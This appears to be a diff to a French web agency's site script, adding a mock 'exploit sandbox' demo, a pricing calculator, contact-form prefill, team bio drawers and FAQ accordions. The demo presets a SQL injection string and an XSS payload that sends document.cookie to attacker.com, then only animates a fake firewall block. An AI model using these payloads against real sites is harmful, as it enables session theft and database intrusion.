@@ -993,6 +993,182 @@ document.querySelectorAll('a[href^="#"]').forEach(anchor => {
     });
   }
 
+  // Cyber Exploit Sandbox
+  const btnFire = document.getElementById('btn-fire-exploit');
+  const exploitVector = document.getElementById('exploit-vector');
+  const exploitPayload = document.getElementById('exploit-payload');
+  const sandboxStatus = document.getElementById('sandbox-status-text');
+  const wafVerdict = document.getElementById('waf-verdict');
+  const wafAction = document.getElementById('waf-action');
+  const wafSignature = document.getElementById('waf-signature');
+  const resultBadge = document.getElementById('sandbox-result-badge');
+
+  if (exploitVector && exploitPayload) {
+    exploitVector.addEventListener('change', () => {
+      const val = exploitVector.value;
+      if (val === 'sqli') {
+        exploitPayload.value = "' OR '1'='1' --";
+      } else if (val === 'xss') {
+        exploitPayload.value = "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>";
+      } else if (val === 'bot') {
+        exploitPayload.value = "Mozilla/5.0 (compatible; SemrushBot/7; +http://www.semrush.com/bot.html)";
+      } else {
+        exploitPayload.value = "";
+        exploitPayload.focus();
+      }
+    });
+    
+    // Set default preset on load
+    exploitPayload.value = "' OR '1'='1' --";
+  }
+
+  if (btnFire) {
+    btnFire.addEventListener('click', () => {
+      const payload = exploitPayload ? exploitPayload.value.trim() : '';
+      if (!payload) {
+        if (sandboxStatus) {
+          sandboxStatus.textContent = 'Erreur: Payload vide !';
+          sandboxStatus.style.color = '#EF4444';
+          setTimeout(() => {
+            sandboxStatus.textContent = 'Prêt à l\'envoi';
+            sandboxStatus.style.color = '';
+          }, 2000);
+        }
+        return;
+      }
+
+      btnFire.disabled = true;
+      btnFire.style.opacity = '0.5';
+
+      if (sandboxStatus) {
+        sandboxStatus.textContent = 'PROBING PORT...';
+        sandboxStatus.style.color = 'var(--clr-cyan)';
+      }
+
+      setTimeout(() => {
+        if (sandboxStatus) {
+          sandboxStatus.textContent = 'MITIGATING ATTACK VECTOR...';
+          sandboxStatus.style.color = '#EF4444';
+        }
+
+        const vector = exploitVector ? exploitVector.value : 'custom';
+        let defcon = 2;
+        let sig = 'CUSTOM-9999';
+        
+        if (vector === 'sqli') {
+          defcon = 1;
+          sig = 'SQLi-9014';
+        } else if (vector === 'xss') {
+          defcon = 1;
+          sig = 'XSS-9015';
+        } else if (vector === 'bot') {
+          defcon = 2;
+          sig = 'BOT-8002';
+        }
+
+        // Apply visual updates to WAF cards
+        if (wafVerdict) {
+          wafVerdict.textContent = 'BLOCKED (Threat)';
+          wafVerdict.style.color = '#EF4444';
+        }
+        if (wafAction) {
+          wafAction.textContent = 'DROP & LOG';
+          wafAction.style.color = '#EF4444';
+        }
+        if (wafSignature) {
+          wafSignature.textContent = sig;
+          wafSignature.style.color = '#EF4444';
+        }
+        if (resultBadge) {
+          resultBadge.textContent = '● BLOCKED';
+          resultBadge.style.color = '#EF4444';
+        }
+
+        // Drop DEFCON
+        state.defcon = defcon;
+        if (statusDot) {
+          statusDot.style.backgroundColor = '#EF4444';
+          statusDot.style.animation = 'pulseGlow 0.4s infinite';
+        }
+        if (statusText) {
+          statusText.textContent = `ATTACK BLOCKED — WAF MITIGATION ENGAGED — DEFCON ${defcon}`;
+          statusText.style.color = '#EF4444';
+        }
+        if (threatLevelEl) {
+          threatLevelEl.textContent = `HIGH THREAT (${defcon === 1 ? '94.20%' : '65.80%'})`;
+          threatLevelEl.style.color = '#EF4444';
+        }
+        if (latencyEl) {
+          const badLat = 250 + Math.floor(Math.random() * 150);
+          latencyEl.textContent = `${badLat}ms`;
+        }
+
+        // Log block message
+        const site = sites[Math.floor(Math.random() * sites.length)];
+        const time = getFormattedTime();
+        const blockMsg = `Exploitation attempt blocked by Edge Web Application Firewall (WAF) rule WAF-9421. Payload: ${payload}`;
+        createAndStoreLog('BLOCKED', blockMsg);
+        renderLogs();
+
+        // Push spike in the chart
+        state.chartData.shift();
+        state.chartData.push(350 + Math.floor(Math.random() * 100));
+        drawChart();
+
+        // Restore everything after 3.5 seconds
+        setTimeout(() => {
+          if (sandboxStatus) {
+            sandboxStatus.textContent = 'Prêt à l\'envoi';
+            sandboxStatus.style.color = '';
+          }
+          if (wafVerdict) {
+            wafVerdict.textContent = 'PASS (Légitime)';
+            wafVerdict.style.color = 'var(--clr-green)';
+          }
+          if (wafAction) {
+            wafAction.textContent = 'MONITOR ONLY';
+            wafAction.style.color = 'var(--clr-text-3)';
+          }
+          if (wafSignature) {
+            wafSignature.textContent = 'NONE (0x000)';
+            wafSignature.style.color = 'var(--clr-text-3)';
+          }
+          if (resultBadge) {
+            resultBadge.textContent = '● SHIELD ON';
+            resultBadge.style.color = 'var(--clr-green)';
+          }
+
+          state.defcon = 4;
+          if (statusDot) {
+            statusDot.style.backgroundColor = 'var(--clr-green)';
+            statusDot.style.animation = 'pulseGlow 1.5s infinite';
+          }
+          if (statusText) {
+            statusText.textContent = 'SYSTEM OPERATIONAL — DEFCON 4';
+            statusText.style.color = 'var(--clr-green)';
+          }
+          if (threatLevelEl) {
+            threatLevelEl.textContent = 'NORMAL (0.02%)';
+            threatLevelEl.style.color = 'var(--clr-cyan)';
+          }
+
+          // Restore normal latency display
+          if (latencyEl) {
+            latencyEl.textContent = '82ms';
+          }
+
+          // Log recovery
+          createAndStoreLog('INFO', '[MITIGATION RESULT] Attack mitigated successfully. Threat signature quarantined. Edge networks stabilized.');
+          renderLogs();
+
+          btnFire.disabled = false;
+          btnFire.style.opacity = '1';
+        }, 3500);
+
+      }, 800);
+    });
+  }
+
   // Active loop for live logs & counters
   function runLoop() {
     if (!state.isDdosActive) {
@@ -1037,4 +1213,315 @@ document.querySelectorAll('a[href^="#"]').forEach(anchor => {
 
 console.log('%c⬡ ARKIS AGENCY', 'color:#00D4FF;font-family:monospace;font-size:18px;font-weight:bold;');
 console.log('%cSecure by Design. Impénétrable par conception.', 'color:#94A3B8;font-family:monospace;font-size:12px;');
+
+// ═══════════════════════════════════════════════
+// 15. INTERACTIVE CYBER ROI & BUDGET SIMULATOR
+// ═══════════════════════════════════════════════
+function initPricingCalculator() {
+  const pagesSlider = document.getElementById('sim-pages');
+  const pagesVal = document.getElementById('sim-pages-val');
+  const dbCheckbox = document.getElementById('sim-db');
+  const securitySelect = document.getElementById('sim-security');
+  const supportSelect = document.getElementById('sim-support');
+
+  const buildPriceEl = document.getElementById('sim-build-price');
+  const runPriceEl = document.getElementById('sim-run-price');
+  const lcpEl = document.getElementById('sim-lcp-val');
+  const securityValEl = document.getElementById('sim-security-val');
+  const quoteBtn = document.getElementById('sim-quote-btn');
+
+  if (!pagesSlider || !pagesVal || !dbCheckbox || !securitySelect || !supportSelect || !buildPriceEl || !runPriceEl || !lcpEl || !securityValEl || !quoteBtn) return;
+
+  function calculate() {
+    const pages = parseInt(pagesSlider.value, 10);
+    const db = dbCheckbox.checked;
+    const security = securitySelect.value;
+    const support = supportSelect.value;
+
+    // Update slider label
+    pagesVal.textContent = `${pages} page${pages > 1 ? 's' : ''}`;
+
+    // 1. Build Price
+    let buildPrice = 2000;
+    if (pages > 5) {
+      buildPrice += (pages - 5) * 150;
+    }
+    if (db) {
+      buildPrice += 1500;
+    }
+    if (security === 'advanced') {
+      buildPrice += 800;
+    } else if (security === 'enterprise') {
+      buildPrice += 2500;
+    }
+
+    // 2. Run Price (Monthly)
+    let runPrice = 29;
+    if (db) {
+      runPrice += 50;
+    }
+    if (security === 'advanced') {
+      runPrice += 120;
+    } else if (security === 'enterprise') {
+      runPrice += 290;
+    }
+
+    if (support === 'essentiel') {
+      runPrice += 149;
+    } else if (support === 'business') {
+      runPrice += 349;
+    } else if (support === 'critique') {
+      runPrice += 890;
+    }
+
+    // 3. Performance Metric (LCP Score)
+    let lcpScore = 100;
+    if (db) lcpScore -= 5;
+    if (pages > 15) lcpScore -= 3;
+    if (security === 'advanced' || security === 'enterprise') {
+      lcpScore += 2;
+    }
+    if (lcpScore > 100) lcpScore = 100;
+
+    // 4. Security Grade
+    let securityGrade = 'Grade B';
+    if (security === 'advanced') securityGrade = 'Grade A';
+    if (security === 'enterprise') securityGrade = 'Grade AA';
+    if (db) {
+      securityGrade += (security === 'enterprise') ? '++' : '+';
+    }
+
+    // Update UI Elements
+    buildPriceEl.textContent = buildPrice.toLocaleString();
+    runPriceEl.textContent = runPrice.toLocaleString();
+    
+    lcpEl.textContent = `${lcpScore} / 100`;
+    if (lcpScore >= 95) {
+      lcpEl.style.color = 'var(--clr-green)';
+    } else if (lcpScore >= 90) {
+      lcpEl.style.color = 'var(--clr-cyan)';
+    } else {
+      lcpEl.style.color = '#FBBF24';
+    }
+
+    securityValEl.textContent = securityGrade;
+    if (security === 'enterprise') {
+      securityValEl.style.color = '#C084FC';
+    } else if (security === 'advanced') {
+      securityValEl.style.color = 'var(--clr-cyan)';
+    } else {
+      securityValEl.style.color = 'var(--clr-text-3)';
+    }
+
+    // Update Quote Link with parameters
+    const budgetRange = buildPrice < 3000 ? '<3k' : buildPrice <= 7000 ? '3-7k' : buildPrice <= 15000 ? '7-15k' : '15k+';
+    const message = `Bonjour Arkis, suite à ma simulation sur votre site, voici mon besoin :
+- Volume : ${pages} pages
+- Base de données Supabase PostgreSQL : ${db ? 'Oui (Sécurité RLS active)' : 'Non'}
+- Bouclier de sécurité Cloudflare WAF : ${security === 'basic' ? 'Standard Edge CDN' : security === 'advanced' ? 'Advanced WAF & DDoS' : 'Zero-Trust Enterprise Vault'}
+- Support & Maintenance RUN : ${support === 'none' ? 'Aucun' : support === 'essentiel' ? 'Essentiel (149€/mois)' : support === 'business' ? 'Business 24/7 (349€/mois)' : 'Critique SLA 99.99% (890€/mois)'}
+
+Estimation de l'infrastructure :
+- Phase 1 (BUILD) : ${buildPrice.toLocaleString()} € (coût unique)
+- Phase 2 (RUN) : ${runPrice.toLocaleString()} € / mois
+
+Merci de reprendre contact pour valider l'architecture.`;
+
+    quoteBtn.href = `/contact?service=web&budget=${budgetRange}&message=${encodeURIComponent(message)}`;
+  }
+
+  // Bind Listeners
+  pagesSlider.addEventListener('input', calculate);
+  dbCheckbox.addEventListener('change', calculate);
+  securitySelect.addEventListener('change', calculate);
+  supportSelect.addEventListener('change', calculate);
+
+  // Initial calculation
+  calculate();
+}
+
+// ═══════════════════════════════════════════════
+// 16. CONTACT FORM AUTO-FILLER FROM URL PARAMS
+// ═══════════════════════════════════════════════
+function handleContactPreFill() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const service = urlParams.get('service');
+  const budget = urlParams.get('budget');
+  const message = urlParams.get('message');
+
+  const serviceSelect = document.getElementById('contact-service');
+  const budgetSelect = document.getElementById('contact-budget');
+  const messageTextarea = document.getElementById('contact-message');
+
+  if (service && serviceSelect) {
+    serviceSelect.value = service;
+  }
+  if (budget && budgetSelect) {
+    budgetSelect.value = budget;
+  }
+  if (message && messageTextarea) {
+    messageTextarea.value = message;
+  }
+}
+
+// ═══════════════════════════════════════════════
+// 17. FOUNDERS & TEAM BIOGRAPHIC SIDEBAR MODAL
+// ═══════════════════════════════════════════════
+function initTeamModals() {
+  const drawer = document.getElementById('bio-drawer');
+  const overlay = document.getElementById('bio-drawer-overlay');
+  const pane = document.getElementById('bio-drawer-pane');
+  const closeBtn = document.getElementById('bio-drawer-close');
+  const content = document.getElementById('bio-drawer-content');
+  const triggers = document.querySelectorAll('.btn-bio-trigger');
+
+  if (!drawer || !overlay || !pane || !closeBtn || !content || triggers.length === 0) return;
+
+  const bios = {
+    alexandre: {
+      initials: 'AV',
+      name: 'Alexandre Voisin',
+      role: 'Co-Fondateur & Lead Architecte Web',
+      color: 'var(--clr-cyan)',
+      bio: "Alexandre est l'architecte principal d'Arkis. Spécialisé dans le développement front-end ultra-performant et les architectures Jamstack modernes (Astro, Next.js), il s'assure que chaque ligne de code est optimisée pour la vitesse, le SEO et la résilience opérationnelle. Il garantit notre score de 100/100 LCP.",
+      experience: "Plus de 8 ans d'expérience dans l'ingénierie logicielle pour des startups technologiques et des plateformes e-commerce à forte charge.",
+      certs: ['AWS Certified Solutions Architect', 'Google UX Design Professional', 'Scrum Alliance Product Owner'],
+      skills: ['React / Next.js', 'Astro / JAMstack', 'Supabase (PostgreSQL)', 'Edge Workers & CDNs', 'TypeScript / Node.js']
+    },
+    mathis: {
+      initials: 'ML',
+      name: 'Mathis Leroy',
+      role: 'Co-Fondateur & Expert Cybersécurité',
+      color: '#A78BFA',
+      bio: "Mathis dirige la division cybersécurité (Red Team / Blue Team) chez Arkis. Certifié OSCP, il passe ses journées à attaquer nos propres créations avant la mise en ligne. Expert en durcissement d'infrastructure et filtrage de trafic à la périphérie du réseau, il veille à ce que vos données restent totalement inviolables.",
+      experience: "Ancien auditeur de sécurité senior pour des cabinets accrédités par l'ANSSI et chercheur de vulnérabilités indépendant (Bug Bounty).",
+      certs: ['OSCP (Offensive Security Certified Professional)', 'CEH (Certified Ethical Hacker)', 'ISO 27001 Lead Implementer'],
+      skills: ['Pen-Testing Applicatif', 'WAF Architecture', 'Audits OWASP Top 10', 'Zero-Trust Networks', 'SIEM & SOC Engineering']
+    },
+    amandine: {
+      initials: 'AR',
+      name: 'Amandine Roche',
+      role: 'Responsable SEO & Marketing Digital',
+      color: 'var(--clr-cyan)',
+      bio: "Amandine est responsable de l'acquisition de trafic et de la visibilité de nos clients sur le web. Elle allie de solides compétences en SEO technique à une vision stratégique de croissance (Growth) pour transformer la rapidité technique d'Arkis en résultats commerciaux concrets.",
+      experience: "6 ans d'expérience en tant que consultante Growth & SEO Lead pour des agences digitales majeures en France.",
+      certs: ['Google Analytics Certified Professional', 'SEMrush Certified SEO Specialist', 'HubSpot Inbound Marketing'],
+      skills: ['SEO Technique (On-Page/Off-Page)', 'Growth Marketing', 'Data Analytics', 'Stratégie de Contenu', 'Conversion Rate Optimization (CRO)']
+    }
+  };
+
+  function openDrawer(bioKey) {
+    const data = bios[bioKey];
+    if (!data) return;
+
+    content.innerHTML = `
+      <div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin-top: 1rem;">
+        <div style="width: 80px; height: 80px; background: rgba(255,255,255,0.02); border: 2px solid ${data.color}; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 1.25rem;">
+          <span style="font-family: var(--font-display); font-size: 1.65rem; font-weight: 800; color: ${data.color};">${data.initials}</span>
+        </div>
+        <h3 style="font-size: 1.5rem; font-weight: 800; color: var(--clr-text); margin-bottom: 0.25rem;">${data.name}</h3>
+        <span class="font-mono" style="font-size: 0.75rem; color: ${data.color}; text-transform: uppercase; letter-spacing: 0.05em;">${data.role}</span>
+      </div>
+
+      <div style="border-top: 1px solid rgba(255,255,255,0.05); padding-top: 1.5rem;">
+        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Biographie</h4>
+        <p style="font-size: 0.9rem; color: var(--clr-text-2); line-height: 1.6;">${data.bio}</p>
+      </div>
+
+      <div>
+        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Parcours & Expérience</h4>
+        <p style="font-size: 0.9rem; color: var(--clr-text-2); line-height: 1.6;">${data.experience}</p>
+      </div>
+
+      <div>
+        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Compétences Clés</h4>
+        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
+          ${data.skills.map(s => `<span style="font-size: 0.72rem; background: rgba(255,255,255,0.03); border: 1px solid var(--clr-border); padding: 0.2rem 0.6rem; border-radius: 6px; color: var(--clr-text-2);">${s}</span>`).join('')}
+        </div>
+      </div>
+
+      <div style="border-top: 1px solid rgba(255,255,255,0.05); padding-top: 1.5rem; margin-bottom: 2rem;">
+        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Certifications & Titres</h4>
+        <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 0.5rem;">
+          ${data.certs.map(c => `
+            <li style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; color: var(--clr-text-2);">
+              <span style="color: ${data.color}; flex-shrink: 0;">✓</span>
+              <span>${c}</span>
+            </li>
+          `).join('')}
+        </ul>
+      </div>
+    `;
+
+    drawer.style.display = 'flex';
+    setTimeout(() => {
+      drawer.classList.add('active');
+      drawer.setAttribute('aria-hidden', 'false');
+      overlay.style.opacity = '1';
+      pane.style.transform = 'translateX(0)';
+    }, 10);
+  }
+
+  function closeDrawer() {
+    overlay.style.opacity = '0';
+    pane.style.transform = 'translateX(100%)';
+    drawer.classList.remove('active');
+    drawer.setAttribute('aria-hidden', 'true');
+    setTimeout(() => {
+      if (!drawer.classList.contains('active')) {
+        drawer.style.display = 'none';
+      }
+    }, 400);
+  }
+
+  triggers.forEach(trigger => {
+    trigger.addEventListener('click', () => {
+      const bioKey = trigger.dataset.bio;
+      openDrawer(bioKey);
+    });
+  });
+
+  closeBtn.addEventListener('click', closeDrawer);
+  overlay.addEventListener('click', closeDrawer);
+  
+  window.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && drawer.classList.contains('active')) {
+      closeDrawer();
+    }
+  });
+}
+
+// ═══════════════════════════════════════════════
+// 18. FAQ ACCORDION TRANSITIONS
+// ═══════════════════════════════════════════════
+function initFaqAccordions() {
+  const triggers = document.querySelectorAll('.faq-trigger');
+  triggers.forEach(trigger => {
+    trigger.addEventListener('click', () => {
+      const item = trigger.closest('.faq-item');
+      const expanded = trigger.getAttribute('aria-expanded') === 'true';
+      
+      document.querySelectorAll('.faq-item').forEach(otherItem => {
+        if (otherItem !== item) {
+          otherItem.classList.remove('active');
+          const otherTrigger = otherItem.querySelector('.faq-trigger');
+          if (otherTrigger) otherTrigger.setAttribute('aria-expanded', 'false');
+        }
+      });
+
+      item.classList.toggle('active');
+      trigger.setAttribute('aria-expanded', !expanded);
+    });
+  });
+}
+
+// ═══════════════════════════════════════════════
+// INITIALIZATION
+// ═══════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', () => {
+  initPricingCalculator();
+  handleContactPreFill();
+  initTeamModals();
+  initFaqAccordions();
+});
 
